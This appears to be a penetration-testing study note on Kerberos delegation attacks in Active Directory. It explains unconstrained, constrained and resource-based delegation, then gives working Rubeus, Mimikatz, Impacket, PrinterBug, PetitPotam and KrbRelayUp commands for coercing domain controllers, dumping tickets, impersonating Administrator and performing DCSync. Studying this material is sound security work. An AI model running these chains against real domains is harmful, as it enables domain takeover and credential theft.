# 📌 Delegation Attacks (Constrained, Unconstrained, RBCD)

> Delegation lets services impersonate users to access other services — great for admins, devastating when misconfigured. Three flavors, each with a distinct attack chain.

---

## 🔍 Definition

Kerberos delegation is a feature that allows a service to request Kerberos tickets on behalf of a user and access other services using that user's identity. It exists so multi-tier apps (web frontend → SQL backend) can authenticate on behalf of the user without storing credentials. Three types exist:

| Type | Scope | Who controls config | Introduced |
|------|-------|-------------------|------------|
| **Unconstrained** | Any service, anywhere | Domain admin sets it on the service account/computer | Windows 2000 |
| **Constrained (KCD)** | Specific services only (SPN list) | Domain admin sets `msDS-AllowedToDelegateTo` | Windows Server 2003 |
| **RBCD** | Controlled by the resource, not the delegating account | Resource owner sets `msDS-AllowedToActOnBehalfOfOtherIdentity` | Windows Server 2012 |

All three types abuse the S4U Kerberos extensions: **S4U2Self** and **S4U2Proxy**.

---

## 🧠 Core Concepts

- **S4U2Self (Service for User to Self)** — allows a service to request a TGS *to itself* on behalf of any user. Used when the user authenticated via NTLM (not Kerberos) — the service needs to "upgrade" to Kerberos to continue the chain
- **S4U2Proxy (Service for User to Proxy)** — allows a service to use a TGS (obtained via S4U2Self or directly) to request a TGS to *another* service on behalf of that user. This is the actual delegation step
- **Forwardable flag** — a TGS flag. Classic constrained delegation (KCD) requires a forwardable TGS from S4U2Self. RBCD does NOT require it — this is key
- **Protocol Transition** — KCD variant. Service can perform S4U2Self even when user authenticated via non-Kerberos method (NTLM). Requires `TrustedToAuthForDelegation` UAC flag
- **Kerberos Only** — KCD variant without protocol transition. Service can only delegate users who authenticated via Kerberos (forwardable TGS already exists)
- **`msDS-AllowedToDelegateTo`** — attribute on delegating account listing which SPNs it can delegate to (KCD)
- **`msDS-AllowedToActOnBehalfOfOtherIdentity`** — attribute on the *target* resource listing which accounts can act on its behalf (RBCD)
- **MachineAccountQuota (MAQ)** — default 10. Non-privileged domain users can create up to 10 machine accounts. Required for RBCD attack when you have no SPN
- **TrustedForDelegation** — UAC flag on machine/user. If set → unconstrained delegation is active on that object
- **PrinterBug / PetitPotam** — coercion tools. Used in unconstrained delegation attacks to force the DC to authenticate to a compromised host, capturing its TGT

---

## ⚙️ How Each Works + How It's Attacked

---

### 1. Unconstrained Delegation

**Legitimate use:** A service account with unconstrained delegation configured. When any user authenticates to it, their TGT is stored in LSASS on that machine. The service can then use that TGT to access any service in the domain as that user.

**Attack:** If you compromise a machine with unconstrained delegation, you can:
1. Extract any TGT cached in LSASS — especially valuable if a DA authenticated recently
2. Actively coerce the DC to authenticate to your machine (PrinterBug/PetitPotam), capture the DC's TGT → DCSync → domain takeover

**Attack flow:**
```
Compromise host with unconstrained delegation
    ↓
Coerce DC auth → DC's TGT lands in LSASS on compromised host
    ↓
Extract TGT with Rubeus/Mimikatz
    ↓
Pass-the-Ticket → DCSync → all hashes
```

---

### 2. Constrained Delegation (KCD)

**Legitimate use:** Service can only impersonate users to a specific list of SPNs. Safer than unconstrained. Requires domain admin to configure `msDS-AllowedToDelegateTo`.

**Protocol Transition variant:** Service has `TrustedToAuthForDelegation` flag. Can do S4U2Self to get a forwardable TGS for any user (even if they authenticated via NTLM), then S4U2Proxy to reach the allowed SPNs.

**Kerberos Only variant:** No `TrustedToAuthForDelegation`. S4U2Self returns a non-forwardable TGS. Can't do classic S4U2Proxy directly → need to chain with RBCD to get a forwardable ticket first.

**Attack (Protocol Transition):**
```
Compromise service account with KCD + Protocol Transition
    ↓
S4U2Self → forwardable TGS as Administrator to "yourself"
    ↓
S4U2Proxy → TGS for allowed SPN (e.g., CIFS/target) as Administrator
    ↓
Access target service as DA
```

> 💡 SPN in the TGS is NOT validated on the server side — you can change the service class (e.g., from `CIFS` to `LDAP`, or `HTTP` to `WSMAN`) to access a different service on the same host. This lets you pivot from a useless service like `wsman` to `LDAP` for a DCSync.

---

### 3. Resource-Based Constrained Delegation (RBCD)

**Legitimate use:** The resource controls who can delegate to it. Modern, more flexible than KCD. Configured by the resource owner, not a domain admin.

**Why it's powerful for attackers:** If you have `GenericWrite`, `GenericAll`, or `WriteProperty` on a **computer object**, you can write to its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. That lets you configure any account you control to impersonate any user to that computer — including Administrator.

**RBCD works with non-forwardable TGS** from S4U2Self — this is the key difference from KCD. Makes it more flexible.

**Attack flow:**
```
Have GenericWrite/GenericAll on VICTIM$ computer object
    ↓
Create/control a machine account FAKE01$ (MAQ allows this by default)
    ↓
Set msDS-AllowedToActOnBehalfOfOtherIdentity on VICTIM$ = FAKE01$
    ↓
S4U2Self: Get TGS for Administrator to FAKE01$ (non-forwardable is fine for RBCD)
    ↓
S4U2Proxy: Get TGS for Administrator to cifs/victim.domain.local
    ↓
Use ticket → local admin / SYSTEM on VICTIM$
```

---

## 📖 Key Terminology

| Term | Meaning |
|------|---------|
| S4U2Self | Service requests TGS to itself on behalf of any user |
| S4U2Proxy | Service uses a TGS to request TGS to another service on behalf of the user |
| Protocol Transition | KCD variant — can impersonate users who didn't use Kerberos auth |
| TrustedToAuthForDelegation | UAC flag required for Protocol Transition. Allows S4U2Self to return forwardable ticket |
| TrustedForDelegation | UAC flag = unconstrained delegation enabled on this account |
| msDS-AllowedToDelegateTo | SPNs this account can delegate to (KCD) |
| msDS-AllowedToActOnBehalfOfOtherIdentity | Who can delegate TO this resource (RBCD) |
| MachineAccountQuota | How many computer accounts a non-admin user can create. Default: 10 |
| KrbRelayUp | Tool to chain Kerberos relay → RBCD → local SYSTEM in one step |
| PrinterBug | Coercion via MS-RPRN to force DC auth to attacker (Unconstrained Delegation abuse) |
| PetitPotam | Coercion via MS-EFSRPC. Used with Unconstrained Delegation or NTLM relay |

---

## 🔥 Important Details & Gotchas

- **Self-RBCD trick is patched** — Microsoft silently patched the technique of setting RBCD on yourself without a second machine account. You need a separate account you control with a SPN (e.g., a machine account via MAQ)
- **MAQ = 0 blocks RBCD** — if MachineAccountQuota is 0, you can't create computer accounts as a non-admin. Check it: `nxc ldap <DC> -u user -p pass -M maq`
- **KCD Kerberos-Only requires forwardable ticket** — if you compromise a KCD account without protocol transition, you need a legit user to Kerberos-authenticate to you, or chain with RBCD to get a forwardable ticket via S4U2Proxy first
- **SPN is not validated server-side in KCD** — the service class part can be substituted. `cifs/target` → `ldap/target` → full DCSync if the KDC issued the ticket for `cifs/target.corp.local` you can alter it for other services on the same host
- **KrbRelayUp = RBCD in one command** — coerces local auth, relays to LDAP, sets RBCD, S4U chain, local SYSTEM. One-liner on unpatched systems (requires no LDAP signing/channel binding)
- **BloodHound edges** — `AllowedToDelegate` = KCD. `AllowedToAct` = RBCD. Both show up in BloodHound paths. Prioritize computers with these edges pointing toward DCs
- **Unconstrained delegation on DCs** — DCs have unconstrained delegation by default. That's expected. Target is *non-DC* machines with unconstrained delegation enabled — these are likely web servers or app servers that got misconfigured

---

## 🌍 Real-World Usage / Examples

**Find delegation misconfigs:**
```bash
# All delegation types at once (Impacket)
impacket-findDelegation corp.local/user:pass -dc-ip <DC-IP>

# Enumerate with BloodHound
bloodhound-python -u user -p pass -d corp.local -ns <DC-IP> -c All
# In BloodHound: search for AllowedToDelegate, AllowedToAct edges

# CME/nxc
nxc ldap <DC-IP> -u user -p pass --trusted-for-delegation    # unconstrained
nxc ldap <DC-IP> -u user -p pass --get-network-info
```

---

### Unconstrained Delegation Attack

```bash
# Find hosts with unconstrained delegation
impacket-findDelegation corp.local/user:pass -dc-ip <DC-IP>
# Look for: TrustedForDelegation = True, on non-DC hosts

# Get a shell on the target machine with unconstrained delegation
# Then dump cached TGTs from LSASS

# Method 1: Rubeus (Windows)
.\Rubeus.exe dump /nowrap      # export all tickets from LSASS

# Method 2: Mimikatz (Windows)
sekurlsa::tickets /export

# Coerce DC auth to your compromised host (PrinterBug)
python3 printerbug.py corp.local/user:pass@<DC-IP> <COMPROMISED-HOST-IP>
# DC's TGT will arrive in LSASS on compromised host

# PetitPotam alternative
python3 PetitPotam.py <COMPROMISED-HOST-IP> <DC-IP>

# Once DC TGT is captured → DCSync
.\Rubeus.exe ptt /ticket:<base64>
impacket-secretsdump -k -no-pass corp.local/DC01$@<DC-IP>
```

---

### Constrained Delegation (Protocol Transition) Attack

```bash
# Enumerate accounts with KCD
impacket-findDelegation corp.local/user:pass -dc-ip <DC-IP>
# Look for: Constrained w/ Protocol Transition = True

# Get TGT for the KCD account
impacket-getTGT corp.local/svc_web:pass -dc-ip <DC-IP>
export KRB5CCNAME=svc_web.ccache

# S4U attack (S4U2Self + S4U2Proxy) — get ticket as Administrator for allowed SPN
impacket-getST -spn cifs/target.corp.local \
  -impersonate Administrator \
  -dc-ip <DC-IP> \
  corp.local/svc_web:pass

export KRB5CCNAME=Administrator@cifs_target.corp.local.ccache
impacket-smbexec -k -no-pass corp.local/Administrator@target.corp.local
```

**Rubeus (Windows):**
```cmd
# Get TGT for KCD account
.\Rubeus.exe asktgt /user:svc_web /ntlm:<hash> /domain:corp.local /ptt

# S4U chain → get ticket as Administrator for CIFS
.\Rubeus.exe s4u /ticket:<base64_tgt> /impersonateuser:Administrator \
  /msdsspn:cifs/target.corp.local /ptt
```

**SPN substitution trick (change cifs → ldap):**
```cmd
.\Rubeus.exe s4u /ticket:<tgt> /impersonateuser:Administrator \
  /msdsspn:cifs/dc.corp.local /altservice:ldap /ptt
# Now have LDAP ticket as Administrator → DCSync
```

---

### RBCD Attack

```bash
# Requirements: GenericWrite/GenericAll on VICTIM$, MAQ > 0

# Step 1: Create attacker-controlled machine account
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Fake@Pass123' \
  -dc-ip <DC-IP> corp.local/lowpriv:pass

# Step 2: Set RBCD — VICTIM$ now trusts FAKE01$ to act on its behalf
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'VICTIM$' \
  -dc-ip <DC-IP> -action write corp.local/lowpriv:pass

# Step 3: S4U2Self + S4U2Proxy — impersonate Administrator to cifs/VICTIM$
impacket-getST -spn cifs/victim.corp.local \
  -impersonate Administrator \
  -dc-ip <DC-IP> \
  corp.local/FAKE01$:Fake@Pass123

# Step 4: Use the ticket
export KRB5CCNAME=Administrator@cifs_victim.corp.local.ccache
impacket-smbexec -k -no-pass corp.local/Administrator@victim.corp.local
# Or: impacket-secretsdump -k -no-pass Administrator@victim.corp.local
```

**Rubeus RBCD:**
```cmd
# Create machine account, set RBCD, then:
.\Rubeus.exe s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:Administrator \
  /msdsspn:cifs/victim.corp.local /ptt
```

**KrbRelayUp (all-in-one — coerce + RBCD + local SYSTEM):**
```bash
# On compromised Windows host (requires LDAP not enforcing signing)
.\KrbRelayUp.exe relay -Domain corp.local -CreateNewComputerAccount \
  -ComputerName FAKE01$ -ComputerPassword Fake@Pass123
.\KrbRelayUp.exe spawn -m rbcd -d corp.local -cn FAKE01$ -cp Fake@Pass123
```

---

## 🔗 Related Topics

- [[Kerberos Authentication]]
- [[Active Directory (AD)]]
- [[Kerberoasting Deep Dive]]
- [[BloodHound & Attack Path Analysis]]
- [[NTLM and Pass-the-Hash]]
- [[Lateral Movement]]
- [[Authentication Coercion (PrinterBug, PetitPotam)]]
- [[Silver Ticket Attacks]]

---

## 📚 Sources / Further Reading

- [The Hacker Recipes — Delegations](https://www.thehacker.recipes/ad/movement/kerberos/delegations/) — best overall reference
- [notsoshant.io — Attacking KCD](https://www.notsoshant.io/blog/attacking-kerberos-constrained-delegation/) — Protocol Transition vs Kerberos Only breakdown
- [Netwrix — RBCD Abuse](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/) — RBCD with MAQ, full walkthrough
- [HackTricks — RBCD](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation) — Impacket command reference updated 2025
- [Medium/dfirloading — RBCD Attack & Detection (Nov 2025)](https://medium.com/@dfirloading/kerberos-resource-based-constrained-delegation-attack-detection-cc342ae3a833) — includes Event ID detection
- [luemmelsec — S4U Deep Dive](https://luemmelsec.github.io/S4fuckMe2selfAndUAndU2proxy-A-low-dive-into-Kerberos-delegations/) — best technical breakdown of S4U mechanics
- [tarlogic — Kerberos III: Delegation](https://www.tarlogic.com/blog/kerberos-iii-how-does-delegation-work/) — protocol-level flow diagrams
- HTB Machines: `Mantis` (KCD), `Cybernetics` lab (all delegation types)
